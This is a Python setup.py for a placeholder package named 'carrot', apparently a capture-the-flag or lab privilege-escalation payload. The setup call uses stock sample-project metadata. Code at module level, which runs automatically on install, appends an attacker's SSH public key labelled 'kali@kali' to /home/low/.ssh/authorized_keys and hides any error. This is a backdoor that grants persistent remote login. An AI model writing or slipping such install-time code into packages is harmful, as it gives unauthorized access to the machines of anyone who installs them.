import setuptools

key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIOzj/5dgISiLunxz16MnTA2tuE2RasMCOddmVOhJjnEO9mim/op4tCVSI2G7JrJzgZq1rVuD96JB/Qd1aF9OS7fbxe2+z5joJXHXnx/qtFIp3eR91F4OP7e9nXtrKjsiPzrE8nAHHzarTj4X6K8TjRkCQh/w/lkYxenrUO8jpjLrSWsPqWhz+L8Zsc+eeVy+emwGrGK0KSayG6jNqsctKLiMJ/AYlqjjai4l5XEZVtiLozXfRBldgZs4GZ+xM+TMcd4y3eqxVIIISyTCD2I+s1g10yDfQNfGGKSCB+quV/CA0+pcv1KBS2BIt+pJIxCZnxeibcAA6ZVlZ5b82cLN3mEb2l5O4+a6PSUHxOA44XboFy50+egE+F2ClEzNwFQJqyKRzonGVAPpLHHrrFS13wgk1p3/W2Z7FUW74ZQK1WsqOXW6MAEL/lAGNGBQXigVNDqacMqUw1sIYY3suKjCvGCsjKGpgjfGNmYr/1y7PYT3LoGZWNfhoJgVWU3Cgols= kali@kali"

try:
    with open("/home/low/.ssh/authorized_keys", "a") as f:
        f.write("\n"+key)
        f.close()

except Exception as e:
    pass

setuptools.setup(
        name="carrot", # Replace with your own username
        version="0.0.1",
        author="Example Author",
        author_email="author@example.com",
        description="A small example package",
        long_description="",
        long_description_content_type="text/markdown",
        url="https://github.com/pypa/sampleproject",
        packages=setuptools.find_packages(),
        classifiers=[
            "Programming Language :: Python :: 3",
            "License :: OSI Approved :: MIT License",
            "Operating System :: OS Independent",
            ],
        )
